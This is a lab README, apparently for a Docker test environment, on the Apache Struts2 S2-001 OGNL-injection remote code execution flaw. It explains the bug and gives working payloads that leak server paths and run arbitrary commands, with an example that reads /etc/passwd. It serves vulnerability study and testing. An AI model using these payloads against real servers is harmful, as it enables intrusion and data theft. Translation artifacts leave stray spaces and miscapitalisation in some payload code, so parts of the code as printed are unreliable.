# S2-001 Remote Code Execution Vulnerability

## Principle

Reference [http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html](http://rickgray.me/2016/05/06/review-struts2-remote -command-execution-vulnerabilities.html)

> The vulnerability is that when the user submits the form data and the validation fails, the backend parses the parameter values ​​previously submitted by the user with the OGNL expression %{value} and repopulates the corresponding form data. For example, the registration or login page, the submitting failure backend will generally return the previously submitted data by default. Since the backend uses %{value} to perform an OGNL expression parsing on the submitted data, you can directly construct Payload for command execution.

## surroundings

Run the following command to start the s2-001 test environment.

```
Docker-compose build
Docker-compose up -d
```

## POC && EXP

Get the tomcat execution path:

```
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
```

Get the web path:

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req .getRealPath('/')),#response.flush(),#response.close()}
```

Execute any command (command plus parameters: `new java.lang.String[]{"cat","/etc/passwd"}`):

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c =new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context. Get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f. getWriter().close()}
```

![](1.jpeg)